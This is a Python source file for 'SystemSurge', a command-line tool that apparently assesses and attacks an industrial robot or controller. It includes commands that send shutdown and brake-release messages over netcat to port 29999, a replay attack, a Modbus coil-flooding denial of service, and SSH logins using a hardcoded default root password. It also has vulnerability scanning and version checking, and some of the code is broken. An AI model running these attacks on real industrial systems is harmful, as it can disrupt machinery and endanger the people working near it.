#!/usr/bin/env python3
import os
import pyfiglet
import cmd
import subprocess
import json
import re
import time
import modbusExploit


class Parser():

    def Semantic_version_checker(current, safe):
        current_semantic = current.split(".")
        safe_semantic = safe.split(".")
        for i in range(len(safe_semantic)):
            if int(current_semantic[i]) < int(safe_semantic[i]):
                return False
        return True


class CLI(cmd.Cmd):

    prompt = '>> '
    intro = "Welcome to SystemSurge"
    target_ip = "0.0.0.0"
    target_user = "root"
    target_pass = "easybot"
    target_pass_default = "easybot"
    score = 0.0

    def printVul(self, doc, name):
        print(name)
        print("")
        print("Ports Vulnerable"+doc["VulnerablePort"])
        print("")
        print("Vulnerable to"+doc["STRIDE"])
        print("")
        print("CVSS: "+str(doc["CVSS"]))
        print("")
        print("Recommendation"+doc["Recommendation"])

    def update_score(self, delta):
        self.score = self.score + delta
        return self.score

    def replay(self, cycles):
        for i in range(cycles):
            os.system(f"echo brake release | nc {self.target_ip} 29999")
            time.sleep(30)
            os.system(f"echo play | nc {self.target_ip} 29999")

    def scanner_nmap(self, ip, port):
        command = ["nmap", self.target_user, "@", ip, "-p", port]

        process = subprocess.Popen(
            command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        result = re.search("open", stdout.decode("utf-8"))
        if len(result.group()) > 1:
            return True
        return False

    def do_modbusRead(self, line):
        """Reads both the coil and register value on a given address (int)"""
        exploit = modbusExploit.ModBusExploit(self.target_ip)
        exploit.read_registers_and_coils(int(line))

    def do_modbusFlood(self, line):
        """Continuos writes to the modbus coils to simulate a DoS attack"""
        exploit = None
        try:
            exploit = modbusExploit.ModBusExploit(self.target_ip)
        except Exception:
            print("could not connect on "+self.target_ip)
            return
        print("Begin Attack")
        for i in range(1000):
            print(str(i % 100)+"%")
            for j in range(0, 150):
                exploit.write_all_coils_on(j)

    def do_version(self, line):
        """version checker"""
        with open('./Versions.json') as f:
            data = json.load(f)
        for key, value in data.items():
            command = "sshpass -p "+self.target_pass+" ssh -t " + \
                self.target_user + "@"+self.target_ip + \
                " "+data[key]["version_cmd"]
            result = subprocess.getoutput(command)
            result = result.replace(self.target_ip, "")
            x = re.search(data[key]["regex"], result)
            try:
                if Parser.Semantic_version_checker(
                        x.group(), data[key]["safe_version"]):
                    print(key+" "+x.group())
                else:
                    self.update_score(0.5)
                    print('\x1b[2;30;41m' + key + " " +
                          x.group() + " " + '\x1b[0m')
            except Exception:
                print(key + " COULD NOT BE FOUND")

    def do_ip(self, line):
        """sets the ip for target"""
        self.target_ip = line.strip()

    def do_pass(self, line):
        """sets the pass for target"""
        self.target_pass = line.strip()

    def do_user(self, line):
        """sets the user for target"""
        self.target_user = line.strip()

    def do_shutdown(self, line):
        """Shutsdown the target"""
        os.system(f"echo shutdown | nc {self.target_ip} 29999")

    def do_replay(self, line):
        """runs a replay attack if target in remote"""
        cycles = int(
            input("How long do you want run replay attack (in minutes): "))*2
        self.replay(cycles)

    def do_vul_analysis(self, line):
        """runs a simple vulnerability analysis"""
        self.score = 0
        self.do_version
        with open('./Vulnerabilities.json') as f:
            data = json.load(f)

        for key, value in data.items():
            for val in data[key]["VulnerablePort"]:
                print(val)
                if self.scanner_nmap(self.target_ip, str(val)):
                    self.printVul(data[key], key)

    def do_quit(self, line):
        """Exit the CLI."""
        return True


if __name__ == '__main__':
    try:
        ascii_banner = pyfiglet.figlet_format("SystemSurge")
        print(ascii_banner)
    except Exception:
        pass

    CLI().cmdloop()
